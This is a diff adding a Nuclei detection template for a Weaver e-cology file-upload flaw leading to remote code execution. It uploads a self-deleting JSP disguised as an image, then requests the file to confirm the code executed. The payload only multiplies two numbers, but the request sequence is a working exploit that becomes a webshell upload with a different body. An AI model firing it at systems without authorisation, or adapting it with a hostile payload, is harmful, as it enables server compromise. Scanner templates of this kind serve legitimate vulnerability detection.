@@ -1,0 +1,65 @@
+id: weaver_e_cology_file_upload_rce
+info:
+  name: Weaver e-cology Arbitrary File Upload to RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects the vulnerability in Weaver e-cology where arbitrary file upload can lead to remote code execution.
+  reference:
+    - https://mp.weixin.qq.com/s/3ip7-U8BsWgq3N4SP5xd4w
+
+variables:
+  r1: "{{rand_int(40000, 44800)}}"
+  r2: "{{rand_int(40000, 44800)}}"
+  rboundary: "{{rand_text_alpha(8)}}"
+  randname: "{{rand_text_alpha(6)}}"
+
+http:
+  - id: upload_file
+    method: POST
+    path:
+      - "{{BaseURL}}/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}"
+    body: |
+      ------WebKitFormBoundary{{rboundary}}
+
+      Content-Disposition: form-data; name="test"; filename="{{randname}}.jsp"
+
+      Content-Type: image/jpeg
+
+      <%out.print({{r1}} * {{r2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+      ------WebKitFormBoundary{{rboundary}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "SUCCESS"
+        part: body
+
+    extractors:
+      - type: regex
+        name: furl
+        part: body
+        internal: true
+        regex:
+          - "','url':'\\/(?P<furl>.*?.jsp)',"
+
+  - id: verify_execution
+    method: GET
+    path:
+      - "{{BaseURL}}/{{furl}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{to_number(r1) * to_number(r2)}}"
+        part: body
